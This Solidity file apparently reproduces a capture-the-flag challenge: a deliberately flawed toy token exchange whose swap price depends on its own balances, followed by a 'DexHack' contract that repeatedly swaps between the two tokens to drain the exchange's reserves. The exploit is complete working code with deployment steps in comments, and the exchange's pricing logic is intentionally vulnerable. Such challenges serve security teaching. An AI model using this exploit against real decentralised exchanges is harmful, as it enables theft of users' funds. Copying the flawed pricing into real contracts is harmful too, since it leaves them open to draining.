// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/release-v3.4/contracts/token/ERC20/IERC20.sol";
import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/release-v3.4/contracts/token/ERC20/ERC20.sol";
import 'https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/release-v3.4/contracts/math/SafeMath.sol';
import 'https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/release-v3.4/contracts/access/Ownable.sol';

contract Dex is Ownable {
    using SafeMath for uint;
    address public token1;
    address public token2;
    constructor() public {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint amount) public view returns(uint){
        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint){
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public returns(bool){
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}


// before deploy:
// 1. predict contract address (cur nonce + 1: approve via dex, deploy)
// 2. approve all owner's token1 and token2 for the contract
contract DexHack {
    constructor(Dex dex) public {
        address owner = msg.sender;
        ERC20 token1 = ERC20(dex.token1());
        ERC20 token2 = ERC20(dex.token2());

        uint t1 = token1.balanceOf(owner);
        token1.transferFrom(owner, address(this), t1);
        uint t2 = token2.balanceOf(owner);
        token2.transferFrom(owner, address(this), t2);

        dex.approve(address(dex), type(uint).max);

        uint d1 = token1.balanceOf(address(dex));
        uint d2 = token2.balanceOf(address(dex));
        while (d1 != 0 && d2 != 0 && t1 + t2 > 0) {
            if (t1 >= t2) {
                uint amount = t1 <= d1 ? t1 : d1;
                dex.swap(address(token1), address(token2), amount);
            } else {
                uint amount = t2 <= d2 ? t2 : d2;
                dex.swap(address(token2), address(token1), amount);
            }
            t1 = token1.balanceOf(address(this));
            t2 = token2.balanceOf(address(this));
            d1 = token1.balanceOf(address(dex));
            d2 = token2.balanceOf(address(dex));
        }

        token1.transfer(owner, t1);
        token2.transfer(owner, t2);
    }
}